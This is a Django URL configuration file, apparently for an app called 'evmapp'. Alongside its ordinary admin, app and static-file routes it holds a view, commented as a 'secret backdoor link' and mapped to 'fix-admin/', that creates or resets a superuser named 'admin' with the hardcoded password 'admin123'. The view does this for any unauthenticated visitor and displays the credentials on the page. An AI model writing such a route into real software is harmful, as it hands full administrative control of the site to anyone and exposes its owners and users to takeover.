from django.contrib import admin
from django.urls import path, include
from django.conf import settings
from django.conf.urls.static import static
from django.http import HttpResponse
from django.contrib.auth.models import User

# --- EMERGENCY ADMIN FIX ---
def fix_admin(request):
    try:
        username = 'admin'
        password = 'admin123'
        
        # Check if admin exists
        if User.objects.filter(username=username).exists():
            # Reset Password
            u = User.objects.get(username=username)
            u.set_password(password)
            u.is_staff = True
            u.is_superuser = True
            u.save()
            return HttpResponse(f"<h1>SUCCESS: Admin Reset</h1><p>Login with: <b>{username}</b> / <b>{password}</b></p>")
        else:
            # Create New
            User.objects.create_superuser(username, 'admin@example.com', password)
            return HttpResponse(f"<h1>SUCCESS: Admin Created</h1><p>Login with: <b>{username}</b> / <b>{password}</b></p>")
            
    except Exception as e:
        return HttpResponse(f"<h1>ERROR: {e}</h1>")

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', include('evmapp.urls')),
    
    # This is your secret backdoor link
    path('fix-admin/', fix_admin),
]

# Serve media/static in debug mode
if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)